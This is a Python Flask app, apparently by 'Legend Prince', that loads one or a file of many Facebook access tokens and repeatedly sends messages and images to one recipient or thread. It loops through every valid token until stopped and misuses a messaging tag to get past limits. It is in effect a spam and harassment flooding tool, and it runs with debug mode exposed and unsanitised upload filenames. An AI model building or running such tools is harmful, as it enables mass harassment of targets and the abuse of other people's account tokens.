from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.debug = True

# Create uploads directory if it doesn't exist
if not os.path.exists('uploads'):
    os.makedirs('uploads')

# Global variables
stop_events = {}
threads = {}

def test_token(access_token):
    """Test if the access token is valid"""
    try:
        url = f"https://graph.facebook.com/v22.0/me"
        params = {
            'access_token': access_token,
            'fields': 'id,name'
        }
        response = requests.get(url, params=params)
        return response.status_code == 200
    except:
        return False

def send_facebook_message(access_token, thread_id, message):
    """Send message to Facebook using correct API"""
    try:
        # Clean thread_id - remove 't_' prefix if present for some endpoints
        clean_thread_id = thread_id.replace('t_', '') if thread_id.startswith('t_') else thread_id
        
        # Method 1: Try using the conversations endpoint
        url = f"https://graph.facebook.com/v22.0/me/messages"
        
        data = {
            'recipient': {'id': clean_thread_id},
            'message': {'text': message},
            'access_token': access_token,
            'messaging_type': 'MESSAGE_TAG',
            'tag': 'NON_PROMOTIONAL_SUBSCRIPTION'
        }
        
        response = requests.post(
            url,
            json=data,
            headers={'Content-Type': 'application/json'}
        )
        
        print(f"Response status: {response.status_code}")
        print(f"Response text: {response.text}")
        
        if response.status_code == 200:
            return True, "Message sent successfully"
        else:
            # Method 2: Try alternative endpoint
            try:
                url2 = f"https://graph.facebook.com/v22.0/{clean_thread_id}/messages"
                data2 = {
                    'message': {'text': message},
                    'access_token': access_token
                }
                
                response2 = requests.post(url2, json=data2)
                if response2.status_code == 200:
                    return True, "Message sent successfully (method 2)"
                else:
                    return False, f"Both methods failed: {response.text} | {response2.text}"
            except Exception as e2:
                return False, f"Primary method failed: {response.text}, Secondary error: {str(e2)}"
                
    except Exception as e:
        return False, f"Error: {str(e)}"

def send_facebook_image(access_token, thread_id, image_path):
    """Send image to Facebook"""
    try:
        clean_thread_id = thread_id.replace('t_', '') if thread_id.startswith('t_') else thread_id
        
        # Upload image first
        upload_url = "https://graph.facebook.com/v22.0/me/message_attachments"
        
        with open(image_path, 'rb') as img_file:
            files = {'filedata': ('image.jpg', img_file, 'image/jpeg')}
            data = {
                'access_token': access_token,
                'message': '{"attachment_type":"image"}'
            }
            
            upload_response = requests.post(upload_url, files=files, data=data)
            
            if upload_response.status_code == 200:
                attachment_id = upload_response.json().get('attachment_id')
                
                # Send the attachment
                message_url = "https://graph.facebook.com/v22.0/me/messages"
                message_data = {
                    'recipient': {'id': clean_thread_id},
                    'message': {
                        'attachment': {
                            'type': 'image',
                            'payload': {'attachment_id': attachment_id}
                        }
                    },
                    'access_token': access_token,
                    'messaging_type': 'MESSAGE_TAG',
                    'tag': 'NON_PROMOTIONAL_SUBSCRIPTION'
                }
                
                message_response = requests.post(message_url, json=message_data)
                return message_response.status_code == 200, "Image sent"
            else:
                return False, f"Upload failed: {upload_response.text}"
                
    except Exception as e:
        return False, f"Image error: {str(e)}"

def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id):
    """Main function to send messages and images"""
    stop_event = stop_events[task_id]
    
    # Filter valid tokens
    valid_tokens = []
    for token in access_tokens:
        token = token.strip()
        if token and test_token(token):
            valid_tokens.append(token)
            print(f"✓ Valid token: {token[:20]}...")
        else:
            print(f"✗ Invalid token: {token[:20]}...")
    
    if not valid_tokens:
        print("No valid tokens found!")
        return
    
    print(f"Starting with {len(valid_tokens)} valid tokens, {len(messages)} messages")
    
    message_count = 0
    image_count = 0
    
    while not stop_event.is_set():
        for message_text in messages:
            if stop_event.is_set():
                break
                
            # Send message from each valid token
            for token in valid_tokens:
                if stop_event.is_set():
                    break
                    
                full_message = f"{mn} {message_text}"
                success, result = send_facebook_message(token, thread_id, full_message)
                
                if success:
                    message_count += 1
                    print(f"✓ [{message_count}] Message sent: {full_message[:50]}...")
                else:
                    print(f"✗ Message failed: {result}")
                
                time.sleep(time_interval)
            
            # Send image after each message cycle if images available
            if image_files and not stop_event.is_set():
                for token in valid_tokens:
                    if stop_event.is_set():
                        break
                        
                    image_file = random.choice(image_files)
                    image_path = os.path.join('uploads', image_file)
                    
                    if os.path.exists(image_path):
                        success, result = send_facebook_image(token, thread_id, image_path)
                        if success:
                            image_count += 1
                            print(f"✓ [{image_count}] Image sent: {image_file}")
                        else:
                            print(f"✗ Image failed: {result}")
                        
                        time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        try:
            # Get form data
            token_option = request.form.get('tokenOption', 'single')
            
            # Handle tokens
            if token_option == 'single':
                single_token = request.form.get('singleToken', '').strip()
                access_tokens = [single_token] if single_token else []
            else:
                token_file = request.files.get('tokenFile')
                if token_file and token_file.filename:
                    access_tokens = token_file.read().decode('utf-8').strip().split('\n')
                    access_tokens = [t.strip() for t in access_tokens if t.strip()]
                else:
                    access_tokens = []
            
            if not access_tokens:
                return "❌ Error: Please provide valid access tokens"
            
            # Get other form data
            thread_id = request.form.get('threadId', '').strip()
            if not thread_id:
                return "❌ Error: Please provide Thread ID"
            
            kidx = request.form.get('kidx', '').strip()
            if not kidx:
                return "❌ Error: Please provide your name"
            
            try:
                time_interval = max(1, int(request.form.get('time', 5)))
            except:
                time_interval = 5
            
            # Handle messages file
            txt_file = request.files.get('txtFile')
            if not txt_file or not txt_file.filename:
                return "❌ Error: Please provide a messages file"
            
            messages = txt_file.read().decode('utf-8').strip().split('\n')
            messages = [m.strip() for m in messages if m.strip()]
            
            if not messages:
                return "❌ Error: No valid messages found in the file"
            
            # Handle images
            image_files = []
            uploaded_images = request.files.getlist('imageFiles')
            for image in uploaded_images:
                if image and image.filename:
                    filename = f"{int(time.time())}_{random.randint(1000,9999)}_{image.filename}"
                    filepath = os.path.join('uploads', filename)
                    image.save(filepath)
                    image_files.append(filename)
            
            # Create task
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            stop_events[task_id] = Event()
            
            # Start thread
            thread = Thread(
                target=send_messages,
                args=(access_tokens, thread_id, kidx, time_interval, messages, image_files, task_id)
            )
            threads[task_id] = thread
            thread.start()
            
            return f'''
            <div style="background: #d4edda; color: #155724; padding: 20px; border-radius: 10px; text-align: center;">
                <h3>✅ Task Started Successfully!</h3>
                <p><strong>Task ID:</strong> {task_id}</p>
                <p><strong>Tokens:</strong> {len(access_tokens)}</p>
                <p><strong>Messages:</strong> {len(messages)}</p>
                <p><strong>Images:</strong> {len(image_files)}</p>
                <p><strong>Interval:</strong> {time_interval} seconds</p>
                <p><a href="/" style="color: #155724;">← Back to Home</a></p>
            </div>
            '''
            
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    # HTML Template
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Message Bot</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 500px;
        }
        .card {
            border: none;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            background: rgba(255,255,255,0.95);
        }
        .card-header {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border-radius: 15px 15px 0 0 !important;
            text-align: center;
            padding: 20px;
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea, #764ba2);
            border: none;
        }
        .form-label {
            font-weight: 600;
            color: #333;
        }
        .preview-img {
            max-width: 80px;
            max-height: 80px;
            margin: 5px;
            border-radius: 8px;
            border: 2px solid #667eea;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h3 class="mb-0">🚀 Facebook Message Bot</h3>
                <p class="mb-0">Send messages and images automatically</p>
            </div>
            <div class="card-body p-4">
                <form method="post" enctype="multipart/form-data">
                    <!-- Token Option -->
                    <div class="mb-3">
                        <label class="form-label">Token Type</label>
                        <select class="form-select" name="tokenOption" onchange="toggleTokenInput()" required>
                            <option value="single">Single Token</option>
                            <option value="multiple">Multiple Tokens</option>
                        </select>
                    </div>

                    <!-- Single Token -->
                    <div class="mb-3" id="singleTokenInput">
                        <label class="form-label">Facebook Access Token</label>
                        <input type="text" class="form-control" name="singleToken" 
                               placeholder="EAABwzLixnjYBO..." required>
                        <div class="form-text">Get your token from Facebook Graph API Explorer</div>
                    </div>

                    <!-- Multiple Tokens -->
                    <div class="mb-3" id="tokenFileInput" style="display: none;">
                        <label class="form-label">Token File</label>
                        <input type="file" class="form-control" name="tokenFile" accept=".txt">
                        <div class="form-text">Upload .txt file with one token per line</div>
                    </div>

                    <!-- Thread ID -->
                    <div class="mb-3">
                        <label class="form-label">Recipient ID</label>
                        <input type="text" class="form-control" name="threadId" 
                               placeholder="123456789 or t_123456789" required>
                        <div class="form-text">Facebook User ID or Thread ID</div>
                    </div>

                    <!-- Name -->
                    <div class="mb-3">
                        <label class="form-label">Your Name</label>
                        <input type="text" class="form-control" name="kidx" 
                               placeholder="Legend Prince" required>
                    </div>

                    <!-- Time Interval -->
                    <div class="mb-3">
                        <label class="form-label">Delay (seconds)</label>
                        <input type="number" class="form-control" name="time" value="5" min="1" required>
                        <div class="form-text">Delay between messages</div>
                    </div>

                    <!-- Messages File -->
                    <div class="mb-3">
                        <label class="form-label">Messages File</label>
                        <input type="file" class="form-control" name="txtFile" accept=".txt" required>
                        <div class="form-text">.txt file with one message per line</div>
                    </div>

                    <!-- Images -->
                    <div class="mb-3">
                        <label class="form-label">Images (Optional)</label>
                        <input type="file" class="form-control" name="imageFiles" multiple accept="image/*">
                        <div class="form-text">Select images to send after each message</div>
                        <div id="imagePreview" class="mt-2"></div>
                    </div>

                    <button type="submit" class="btn btn-primary w-100 py-2">🎯 Start Sending</button>
                </form>

                <!-- Stop Form -->
                <form method="post" action="/stop" class="mt-4">
                    <div class="mb-3">
                        <label class="form-label">Stop Task</label>
                        <input type="text" class="form-control" name="taskId" 
                               placeholder="Enter Task ID to stop" required>
                    </div>
                    <button type="submit" class="btn btn-danger w-100 py-2">🛑 Stop Task</button>
                </form>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center mt-4 text-white">
            <p>© 2024 Developed by Legend Prince</p>
            <p>
                <a href="https://www.facebook.com/100064267823693" class="text-white me-3">Facebook</a>
                <a href="https://wa.me/+917543864229" class="text-white">WhatsApp</a>
            </p>
        </div>
    </div>

    <script>
        function toggleTokenInput() {
            const option = document.querySelector('[name="tokenOption"]').value;
            document.getElementById('singleTokenInput').style.display = 
                option === 'single' ? 'block' : 'none';
            document.getElementById('tokenFileInput').style.display = 
                option === 'multiple' ? 'block' : 'none';
            
            // Update required attribute
            document.querySelector('[name="singleToken"]').required = option === 'single';
            document.querySelector('[name="tokenFile"]').required = option === 'multiple';
        }

        // Image preview
        document.querySelector('[name="imageFiles"]').addEventListener('change', function(e) {
            const preview = document.getElementById('imagePreview');
            preview.innerHTML = '';
            
            Array.from(this.files).forEach(file => {
                if (file.type.startsWith('image/')) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        const img = document.createElement('img');
                        img.src = e.target.result;
                        img.className = 'preview-img';
                        preview.appendChild(img);
                    }
                    reader.readAsDataURL(file);
                }
            });
        });

        // Initialize
        toggleTokenInput();
    </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId', '').strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        if task_id in threads:
            threads[task_id].join(timeout=2)
            del threads[task_id]
        del stop_events[task_id]
        return f'✅ Task {task_id} has been stopped successfully!'
    else:
        return f'❌ Task {task_id} not found!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
